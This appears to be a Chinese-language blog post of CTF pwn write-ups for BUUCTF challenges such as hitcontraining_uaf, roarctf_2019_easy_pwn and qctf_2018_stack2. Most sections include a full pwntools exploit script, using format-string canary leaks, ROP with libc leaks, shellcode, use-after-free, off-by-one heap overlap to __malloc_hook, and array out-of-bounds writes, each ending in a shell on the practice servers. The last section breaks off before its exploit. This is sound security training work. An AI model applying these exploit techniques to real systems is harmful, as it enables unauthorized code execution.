<p>一个函数里面有着格式化字符串漏洞，允许我们输入六个长度的数据，用来泄露canary的，然后在后面的函数里面存在栈溢出，泄露libc的以及getshell的。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210529092432.png"></p>
<p>AAAAAA是我输进去的内容，他的位置在栈顶处，是格式化字符串的第六个参数，可以看见，在其下面的就是我们要的canary了，所以是第七个参数，从而确定构造为”%7$p”，之后就是正常的普通rop内容了。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27477</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x400993</span><br>main=<span class="hljs-number">0x400887</span><br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>printf_got=elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload=<span class="hljs-string">&#x27;%7$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;u!&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(canary)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.recv()<br>read=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(read)<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(canary)+<span class="hljs-string">&#x27;deadbeef&#x27;</span>+p64(pop_rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">&quot;story!&quot;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十一、bjdctf-2020-router"><a href="#四十一、bjdctf-2020-router" class="headerlink" title="四十一、bjdctf_2020_router"></a>四十一、bjdctf_2020_router</h3><p>常规checksec一下，看看保护</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210605121040.png"></p>
<p>只开启了NX</p>
<p>进入ida看看代码<img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210605121308.png"></p>
<p>第一个功能很神奇的让我们输入一个长度为0x10的数据，然后用system调用？我跑去nc了一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210605121007.png"></p>
<p>好吧，成功获得flag了。</p>
<h3 id="四十二、picoctf-2018-shellcode"><a href="#四十二、picoctf-2018-shellcode" class="headerlink" title="四十二、picoctf_2018_shellcode"></a>四十二、picoctf_2018_shellcode</h3><p>checksec一下<img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210614103954.png"></p>
<p>保护都没开启，拖入ida分析一下。无法F5反汇编，只能看汇编代码了。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210614104047.png"></p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210614104037.png"></p>
<p>有个vuln函数，里面有调用gets和puts两个函数，可以进行输入。再看其他代码，底下有个call eax，可以进行执行代码，看下eax的内容来自哪里</p>
<p><img src="/2021/04/07/2021-04-07-buu03/QQ%E5%9B%BE%E7%89%8720210614104610.png"></p>
<p>这里传递给eax的地址与下面调用时一致，然后vuln函数里面gets输入的地址是ebp+8中存放的地址，其实就是eax里面的地址内容，所以整个程序总的说就是会执行我们输入进去的东西，加上nx未开，输入shellcode来getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">28165</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br>p.sendlineafter(<span class="hljs-string">&quot;string!&quot;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十三、hitcontraining-uaf"><a href="#四十三、hitcontraining-uaf" class="headerlink" title="四十三、hitcontraining_uaf"></a>四十三、hitcontraining_uaf</h3><p>常规checksec一下</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727132448387.png"><span class="image-caption">image-20210727132448387</span></p>
<p>进入ida看看，其实题目已经有暗示，uaf，所以我们先去delete函数里面看看，</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727132528641.png"><span class="image-caption">image-20210727132528641</span></p>
<p>确实存在着uaf，那么该怎么利用？再看看add函数和printf函数</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727132617843.png"><span class="image-caption">image-20210727132617843</span></p>
<p>这边的add函数比较奇怪，首先是有次数限制只能申请五个堆块，其次是会申请两个堆块，第一个堆块是固定8字节大小，前4个字节存放一个print_note_content函数的地址，后4个字节是我们可以控制的，申请一个任意大小的堆块</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727132832076.png"><span class="image-caption">image-20210727132832076</span></p>
<p>在print函数里面，最后会进行函数调用，就是调用先前在add函数里面保存的print_note_content函数进行打印我们可以控制的堆块里面的内容</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727133015119.png"><span class="image-caption">image-20210727133015119</span></p>
<p>最后就是还存在一个后门函数</p>
<p>思路：一开始是觉得没有edit这类的函数，可能是要制造堆块重叠，把后门函数劫持到malloc_hook里面去，还以为5个会够，但是一个泄露libc基址，再一个申请fastchunk进行double free，然后还需要申请四次，超过次数了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727135534549.png"><span class="image-caption">image-20210727135534549</span></p>
<p>这是double free的fastbin上的情况，因为free也是两个，所以直接进行两次操作直接就可以构造出A-B-A</p>
<p>所以换一种方法：利用那个函数调用，想办法把进行调用的堆块变成是我们可以控制的那个堆块，把内容改成后门函数，那么就可以getshell了！</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727140624461.png"><span class="image-caption">image-20210727140624461</span></p>
<p>像这样，我们可以控制的堆块申请一个比0x8大的堆块，那么我们就不会申请走，而固定申请大小为0x8的堆块就会申请走一个，此时我们，如果再申请0x8的堆块，就会进行更换了，我们申请到的就是之前程序的固定堆块，最后printf一下，就getshell了！</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210727141018340.png"><span class="image-caption">image-20210727141018340</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br><span class="hljs-comment">#p = process(argv=[ld.path,elf.path],env=&#123;&quot;LD_PRELOAD&quot; : libc.path&#125;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26333</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  p.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>shell_addr=<span class="hljs-number">0x8048945</span><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>,p32(shell_addr))<br>printf(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十四、picoctf-2018-buffer"><a href="#四十四、picoctf-2018-buffer" class="headerlink" title="四十四、picoctf_2018_buffer"></a>四十四、picoctf_2018_buffer</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210728144721443.png"><span class="image-caption">image-20210728144721443</span></p>
<p>checksec的情况来看以及名字，应该是道栈题目，进入ida看看</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210728144750715.png"><span class="image-caption">image-20210728144750715</span></p>
<p>漏洞点应该是在这了，存在明显栈溢出</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210728145612076.png"><span class="image-caption">image-20210728145612076</span></p>
<p>程序本身还蕴含着一个函数，这个函数会读取flag里面的内容，只要通过判断即可打印出flag</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210728145716640.png"><span class="image-caption">image-20210728145716640</span></p>
<p>而这里的a1，a2就是该函数的参数。</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210728150414970.png"><span class="image-caption">image-20210728150414970</span></p>
<p>成功获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28765</span>)<br>win_addr=<span class="hljs-number">0x080485CB</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p32(win_addr)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0xDEADBEEF</span>)+p32(<span class="hljs-number">0xDEADC0DE</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Please enter your string:&quot;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十五、roarctf-2019-easy-pwn"><a href="#四十五、roarctf-2019-easy-pwn" class="headerlink" title="四十五、roarctf_2019_easy_pwn"></a>四十五、roarctf_2019_easy_pwn</h3><p>常规checksec一下，保护全开，可能是道堆题了，进入ida看看程序</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210728151846042.png"><span class="image-caption">image-20210728151846042</span></p>
<p>漏洞点在于write函数里面</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210730125048904.png"><span class="image-caption">image-20210730125048904</span></p>
<p>这里会把我们之前申请堆块时输入的size与现在要写入的size进行比较，如果我们现在写入的size比原来的size大10，就可以多写一个，所以漏洞点是offbyone</p>
<p>泄露libc，因为calloc会清空堆块的数据，所以这边借着溢出，把is_mmap位改为1，就不会被清空数据，借此把libc泄露出来</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210730215233503.png"><span class="image-caption">image-20210730215233503</span></p>
<p>然后就利用offbyone修改堆块的size，制造overlop，修改被覆盖的堆块的fd指针，然后把堆块申请到malloc_hook上去</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210730233057769.png"><span class="image-caption">image-20210730233057769</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210730233446054.png"><span class="image-caption">image-20210730233446054</span></p>
<p>这边我已经成功写进去了，但是没有getshell，四种都没办法getshell，那接下来，就有很多处理方式了</p>
<ul>
<li>转而去修改free_hook函数</li>
<li>利用realloc调整栈帧</li>
<li>house of orange（通杀2.23以及2.24）</li>
</ul>
<p>这边我使用realloc调整栈帧，其他方法后续会更新的（我也不知道后续是多久~）</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210731002134507.png"><span class="image-caption">image-20210731002134507</span></p>
<p>这边可以看见，并不会为NULL，所以one_gadget条件没有达成，然后看看realloc,会压栈</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210731002037708.png"><span class="image-caption">image-20210731002037708</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210731002752890.png"><span class="image-caption">image-20210731002752890</span></p>
<p>发现，其实压栈导致的rsp-0x8，已经让one_gadget的条件达成了，所以就不用再去找了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210731001850853.png"><span class="image-caption">image-20210731001850853</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./roarctf_2019_easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25420</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;size: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size+<span class="hljs-number">10</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+<span class="hljs-string">&#x27;\x93&#x27;</span>)<br>add(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c4b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>rlh=libc_base+libc.sym[<span class="hljs-string">&#x27;&#x27;</span>]<br>realloc=libc_base+libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0x4526a</span><br>log.success(<span class="hljs-string">&quot;libc base==&gt;0x%x&quot;</span> %libc_base)<br>log.success(<span class="hljs-string">&quot;__malloc_hook==&gt;0x%x&quot;</span> %mlh)<br>log.success(<span class="hljs-string">&quot;realloc==&gt;0x%x&quot;</span> %realloc)<br>log.success(<span class="hljs-string">&quot;one_gadget==&gt;0x%x&quot;</span> %ogg)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x88</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+<span class="hljs-string">&#x27;\xe1&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xd8</span>)<span class="hljs-comment">#2</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span><br>payload=p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)+p64(ogg)+p64(realloc)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-built_in">len</span>(payload)-<span class="hljs-number">10</span>,payload)<br><br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x10</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十六wustctf2020-getshell-2"><a href="#四十六wustctf2020-getshell-2" class="headerlink" title="四十六wustctf2020_getshell_2"></a>四十六wustctf2020_getshell_2</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210808202602382.png"><span class="image-caption">image-20210808202602382</span></p>
<p>先checksec一下，32位，开启保护只有nx</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808203034653.png"><span class="image-caption">image-20210808203034653</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808205220758.png"><span class="image-caption">image-20210808205220758</span></p>
<p>ida里面十分简单，漏洞点就这么一些东西，说明就是一个栈溢出，而溢出算上返回地址，只有八个字节，给的后门函数是无法使用的，那么如果按照原来的构造方法，字节数是不够的，因为加上返回地址，那明显是要十二个字节。然后这边的字符要去找sh，只有sh也是可以getshell的，除此之外，那如果要不需要返回地址，那就要去跳转到这边的程序里面已经有的call _system，就可以不需要返回地址，因为call指令会自动的将下一条指令压入栈中作为返回地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808205011413.png"><span class="image-caption">image-20210808205011413</span></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27986</span>)<br>sys = <span class="hljs-number">0x8048529</span><br>sh = <span class="hljs-number">0x08048670</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1c</span> + p32(sys) + p32(sh)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十七、qctf-2018-stack2"><a href="#四十七、qctf-2018-stack2" class="headerlink" title="四十七、qctf_2018_stack2"></a>四十七、qctf_2018_stack2</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210808210516960.png"><span class="image-caption">image-20210808210516960</span></p>
<p>checksec一下，32位，且有nx以及canary，那就要先去寻找怎么泄露canary了，不然是没法做的</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808214029860.png"><span class="image-caption">image-20210808214029860</span></p>
<p>分析了一下程序的功能，不存在溢出点，输入函数也都是用的scanf，只有这个地方应该是有问题的，首先这个数组的是在栈上的，而数组下标我们是可以控制的，那就存在了数组越界问题了。并且给了一个后门函数，那就可以逐个字节的输入进去，覆盖返回地址，这样也就不需要去泄露canary了</p>
<p>然后就是数组的偏移，直接看ida的反汇编是错误的，为什么会错？</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808222850151.png"><span class="image-caption">image-20210808222850151</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808222112204.png"><span class="image-caption">image-20210808222112204</span></p>
<p>汇编代码可以解惑：由于这边的处理不同，导致ebp的下方并不是返回地址，而是还有一段距离，就要去调试获得了</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808225803029.png"><span class="image-caption">image-20210808225803029</span></p>
<p>我选择在下标为1的位置输入调试，而这边[ebp+eax*1-0x70]就是输入的数最终会存放的地方，因为我输的是0，所以可以算出的ebp-0x70就是数组的起始地址，这样只要再去算一下返回地址到这的偏移即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808230055266.png"><span class="image-caption">image-20210808230055266</span></p>
<p>算出偏移之后就是利用数组越界把后门函数地址写入到返回地址</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210808221957029.png"><span class="image-caption">image-20210808221957029</span></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">25028</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p.recvuntil(<span class="hljs-string">&quot;have:&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br>get_shell = [<span class="hljs-number">0x9b</span>,<span class="hljs-number">0x85</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x08</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>	p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;change&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x84</span>+i))<br>	p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(get_shell[i]))<br>p.sendlineafter(<span class="hljs-string">&quot;5. exit&quot;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="四十八、-ZJCTF-2019-Login"><a href="#四十八、-ZJCTF-2019-Login" class="headerlink" title="四十八、[ZJCTF 2019]Login"></a>四十八、[ZJCTF 2019]Login</h3><p><img src="/2021/04/07/2021-04-07-buu03/image-20210812160620361.png"><span class="image-caption">image-20210812160620361</span></p>
<p>先checksec一下，64位，开启了nx和canary，可能要泄露canary，进入ida分析一下</p>
<p>进入程序，是个用c++编写的程序，看起来有些费力</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812162011685.png"><span class="image-caption">image-20210812162011685</span></p>
<p>首先找到了一个后门函数，那么就再去找找输入点，看看有没有溢出，以及找找有没有函数调用的地方。然后可以发现，输入点是不存在溢出到返回地址的，但是可以找到一个能进行函数调用的地方</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812162329071.png"><span class="image-caption">image-20210812162329071</span></p>
<p>在整个程序的最后，进行密码验证，如果通过就会进行函数调用。那么，就去找找这个函数调用从哪里传入，是否可以修改？以及怎么通过检验</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812165314541.png"><span class="image-caption">image-20210812165314541</span></p>
<p>首先通过验证，把这的账号密码输入进去即可</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812165836228.png"><span class="image-caption">image-20210812165836228</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812165850893.png"><span class="image-caption">image-20210812165850893</span></p>
<p>然后就是要进行覆盖，把v8覆盖为后门函数，v8又来自vuln，而vuln似乎不是我们可以控制的变量。但是去查汇编代码，可以知道最后的函数调用，表现是call rax，那是否可以去修改rax的数据呢？</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812170456157.png"><span class="image-caption">image-20210812170456157</span></p>
<p>这里很有意思，在call rax前可以追溯到rax的值来自栈上一个数据，可以去看看能不能覆盖</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812172747784.png"><span class="image-caption">image-20210812172747784</span></p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812172859005.png"><span class="image-caption">image-20210812172859005</span></p>
<p>这里传入的rax的值就是源头，而这里的值是栈上的，并且我们是可以覆盖的，就是在第二个输入点输入密码的地方</p>
<p>成功getshell</p>
<p><img src="/2021/04/07/2021-04-07-buu03/image-20210812164617984.png"><span class="image-caption">image-20210812164617984</span></p>
<p>exp：</p>
